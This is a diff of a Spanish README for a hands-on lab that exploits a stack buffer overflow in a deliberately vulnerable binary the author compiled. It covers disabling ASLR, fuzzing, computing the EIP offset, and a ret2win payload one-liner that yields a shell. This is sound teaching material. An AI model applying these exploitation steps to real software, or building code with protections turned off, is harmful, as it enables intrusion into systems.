@@ -1,12 +1,12 @@
 # Laboratorio práctico — del fallo al exploit
 
-Este laboratorio reproduce, de principio a fin, el ciclo de explotación de un
-stack buffer overflow sobre un binario vulnerable escrito y compilado por ti. Es
-la parte práctica del capítulo [04 – Caso práctico](../docs/04-caso-practico.md).
+Aquí reproduzco, de principio a fin, el ciclo de explotación de un stack buffer
+overflow sobre un binario vulnerable que escribí y compilé yo. Es la parte
+práctica del capítulo [04 – Caso práctico](../docs/04-caso-practico.md).
 
-**Solo para laboratorio aislado.** El código es deliberadamente inseguro. No lo
-ejecutes en una máquina de producción ni lo uses contra sistemas que no sean
-tuyos.
+Todo esto corre en un laboratorio aislado y con código deliberadamente inseguro.
+No lo ejecuto en una máquina de producción ni contra nada que no sea mío, y quien
+lo reproduzca debería hacer lo mismo.
 
 ## Contenido
 
@@ -19,12 +19,12 @@ tuyos.
 | `fuzzer.py` | Envía entradas crecientes hasta provocar el crash (fase 1) |
 | `find_offset.py` | Genera patrón cíclico y calcula el offset exacto de EIP |
 | `exploit.py` | Plantilla de exploit (ret2win) que demuestra el control de flujo |
-| `capturas/` | Aquí van tus capturas (abajo se indica qué capturar) |
+| `capturas/` | Mis capturas de pantalla de cada paso |
 
-## 0. Requisitos del entorno
+## 0. El entorno
 
-Lo recomendable es una VM Linux de laboratorio (Kali, Parrot o Ubuntu) aislada,
-con snapshot antes de empezar. El montaje depende de la arquitectura de tu host.
+Trabajo sobre una VM Linux de laboratorio (Kali, Parrot o Ubuntu) aislada, con
+snapshot antes de empezar. El montaje cambia según la arquitectura del host.
 
 ### Host x86 / x86-64 (PC Intel o AMD)
 
@@ -35,9 +35,9 @@ pip install pwntools --break-system-packages    # cyclic(), process(), etc.
 
 ### Host ARM64 (Mac con Apple Silicon → Kali ARM64)
 
-En ARM64 no existe `gcc-multilib`, así que no puedes compilar x86-32 de forma
-nativa. La salida, fiel al manual porque sigue siendo x86/EIP, es compilar con el
-cross-compiler i686 en estático y ejecutar bajo QEMU:
+Es mi caso. En ARM64 no existe `gcc-multilib`, así que no puedo compilar x86-32 de
+forma nativa. La salida, fiel al manual porque sigue siendo x86/EIP, es compilar
+con el cross-compiler i686 en estático y ejecutar bajo QEMU:
 
 ```bash
 sudo apt update
@@ -47,11 +47,11 @@ pip install pwntools --break-system-packages    # opcional
 ```
 
 Con `qemu-user-static` y `binfmt-support`, los binarios i386 se ejecutan de forma
-transparente (`./build/vuln_linux` funciona sin escribir `qemu-i386` delante), lo
-que deja usar `fuzzer.py` y `exploit.py` sin cambios. Para depurar sí usarás
-`qemu-i386 -g` con `gdb-multiarch` (ver §4).
+transparente (`./build/vuln_linux` corre sin escribir `qemu-i386` delante), así
+que `fuzzer.py` y `exploit.py` funcionan sin tocar nada. Para depurar sí uso
+`qemu-i386 -g` con `gdb-multiarch` (lo veo en §4).
 
-En los dos casos, desactiva ASLR mientras practicas:
+En los dos casos, desactivo ASLR mientras practico:
 
 ```bash
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
@@ -62,33 +62,33 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```bash
 cd labs
 make linux          # host x86: build/vuln_linux (32 bits, sin canary/PIE, execstack)
-# --- o, en host ARM64 / Apple Silicon: ---
+# --- o, en mi host ARM64 / Apple Silicon: ---
 make cross          # compila x86-32 ESTÁTICO para ejecutar bajo QEMU
 ```
 
-Comprueba las protecciones:
+Compruebo las protecciones:
 
 ```bash
 checksec --file=build/vuln_linux
 ```
 
-Cuidado con `checksec` en binarios estáticos (host ARM): al enlazar en estático
-(`-static`), puede mostrar "Canary found" como falso positivo, porque detecta el
-símbolo `__stack_chk_fail` que trae la glibc incrustada. Tu `vulnerable_function`
-se compiló con `-fno-stack-protector`, así que no tiene canary. Compruébalo:
+Un detalle con `checksec` en binarios estáticos (host ARM): al enlazar en estático
+(`-static`) puede mostrar "Canary found" como falso positivo, porque detecta el
+símbolo `__stack_chk_fail` que trae la glibc incrustada. Mi `vulnerable_function`
+se compiló con `-fno-stack-protector`, así que no tiene canary. Lo confirmo:
 
 ```bash
 i686-linux-gnu-objdump -d build/vuln_linux | grep -A25 '<vulnerable_function>:'
-#  -> verás 'call ...strcpy' y NINGUNA '__stack_chk'
+#  -> veo 'call ...strcpy' y NINGUNA '__stack_chk'
 ```
 
 La prueba definitiva llega en §2: el crash es SIGSEGV (señal 11), no SIGABRT
-(señal 6). Si hubiera canary activo, veríamos "stack smashing detected".
+(señal 6). Si hubiera canary activo, vería "stack smashing detected".
 
-Captura 1: guarda la salida de `checksec` (y, en ARM, el `objdump`) en
-`capturas/01-checksec.png`.
+Captura 1 (`capturas/01-checksec.png`): la salida de `checksec` y, en ARM, el
+`objdump`.
 
-### (Opcional) Compilar también la versión del manual en Windows
+### (Opcional) La versión del manual en Windows
 
 En una VM Windows con [MinGW](https://sourceforge.net/projects/mingw/):
 
@@ -109,9 +109,9 @@ gcc -m32 -o corregido.exe corregido.c
 # -> Segmentation fault (core dumped)    <-- la entrada corrompe la pila
 ```
 
-En host ARM64, binfmt ejecuta el binario x86 de forma transparente; también
-puedes ser explícito con `qemu-i386 ./build/vuln_linux hola`. El crash aparece
-como `qemu: uncaught target signal 11 (Segmentation fault)`.
+En mi host ARM64, binfmt ejecuta el binario x86 de forma transparente; también
+puedo ser explícito con `qemu-i386 ./build/vuln_linux hola`. El crash aparece como
+`qemu: uncaught target signal 11 (Segmentation fault)`.
 
 Captura 2: `capturas/02-ejecucion-normal-vs-crash.png`.
 
@@ -174,7 +174,7 @@ gdb-multiarch -q build/vuln_linux
 ...
 Program received signal SIGSEGV, Segmentation fault.
 (gdb) info registers eip
-eip   0x61616174   0x61616174          # valor real de este laboratorio
+eip   0x61616174   0x61616174          # valor real de mi laboratorio
 ```
 
 ### Resolver el offset (los dos casos)
@@ -185,7 +185,7 @@ python3 find_offset.py find 0x61616174
 # [>] Estructura del payload: b'A'*76 + <4 bytes EIP> + <resto>
 ```
 
-Verifica el control total enviando `A*76 + BBBB` y confirmando `eip = 0x42424242`:
+Verifico el control total mandando `A*76 + BBBB` y confirmando `eip = 0x42424242`:
 
 ```bash
 # Host x86 nativo:
@@ -202,20 +202,20 @@ gdb -q ./build/vuln_linux
 #        (gdb) info registers eip     # eip = 0x42424242 -> control total
 ```
 
-Captura 4: `capturas/04-control-eip.png`, la que muestra `eip = 0x42424242`. Es la
+Captura 4 (`capturas/04-control-eip.png`): la que muestra `eip = 0x42424242`. Es la
 que mejor resume todo el trabajo.
 
 ## 5. Explotación: redirigir el flujo a `win()` (ret2win)
 
-Saca la dirección real de `win()`. El binario de este laboratorio la imprime al
-arrancar (`[i] Direccion de win(): 0x...`); también con:
+Saco la dirección real de `win()`. Mi binario la imprime al arrancar
+(`[i] Direccion de win(): 0x...`); también con:
 
 ```bash
 # Host x86:    nm -n build/vuln_linux | grep ' win'
 # Host ARM64:  i686-linux-gnu-nm -n build/vuln_linux | grep ' win'
 ```
 
-Ajusta `exploit.py` con TUS valores y lánzalo (en host ARM corre vía binfmt):
+Ajusto `exploit.py` con mis valores y lo lanzo (en host ARM corre vía binfmt):
 
 ```bash
 sed -i 's/^OFFSET = .*/OFFSET = 76/'            exploit.py
@@ -223,16 +223,16 @@ sed -i 's/^WIN_ADDR = .*/WIN_ADDR = 0x08049895/' exploit.py
 python3 exploit.py ./build/vuln_linux
 ```
 
-Cuidado con pasar bytes crudos, no str. La dirección tiene bytes altos (`0x95`,
-`0x98`). Si se decodificaran a texto, `subprocess` los recodificaría a UTF-8 y
-corromperían el payload. `exploit.py` ya pasa los bytes crudos por `argv`.
+Aquí me comí un crash por un detalle: la dirección tiene bytes altos (`0x95`,
+`0x98`), y si paso el payload como string decodificado, `subprocess` los recodifica
+a UTF-8 y los corrompe. Por eso `exploit.py` pasa los bytes crudos por `argv`.
 Equivalente directo:
 
 ```bash
 python3 -c 'import subprocess, struct; p=b"A"*76+struct.pack("<I",0x08049895); subprocess.run([b"./build/vuln_linux", p])'
 ```
 
-Si todo encaja, el flujo salta a `win()` y obtienes una shell:
+Si todo encaja, el flujo salta a `win()` y sale una shell:
 
 ```
 [+] win() alcanzada: control de flujo conseguido.
@@ -246,7 +246,7 @@ Captura 5: `capturas/05-ret2win-shell.png`.
 
 ## 6. Contraste con el binario protegido y el corregido
 
-Compila la misma vulnerabilidad pero con canary activado y mira la diferencia:
+Compilo la misma vulnerabilidad pero con canary activado y comparo:
 
 ```bash
 # Host x86 nativo:
@@ -290,6 +290,6 @@ flowchart TD
     D --> R[Documentar hallazgos]
 ```
 
-Cada paso de este laboratorio corresponde a una fase de la
+Cada paso de este laboratorio se corresponde con una fase de la
 [metodología](../docs/01-metodologia.md). La teoría y la práctica son lo mismo
 visto desde dos lados.
